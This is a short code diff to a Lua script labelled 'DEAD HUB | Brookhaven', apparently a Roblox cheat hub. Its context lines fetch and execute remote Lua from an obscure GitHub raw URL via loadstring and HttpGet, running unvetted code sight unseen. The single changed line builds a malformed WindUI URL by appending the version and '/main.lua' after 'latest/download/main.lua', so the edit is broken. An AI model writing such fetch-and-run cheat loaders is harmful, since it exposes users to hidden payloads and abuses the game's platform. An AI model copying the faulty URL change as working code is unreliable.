@@ -361,7 +361,7 @@ local Version = "1.6.41"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/dssdg1223/fdhfdhfdh/refs/heads/main/asfdg.lua"))()
 
-local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/download/" .. Version .. "/main.lua"))()
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua" .. Version .. "/main.lua"))()
 
 local Window = WindUI:CreateWindow({
     Title = "DEAD HUB | Brookhaven",
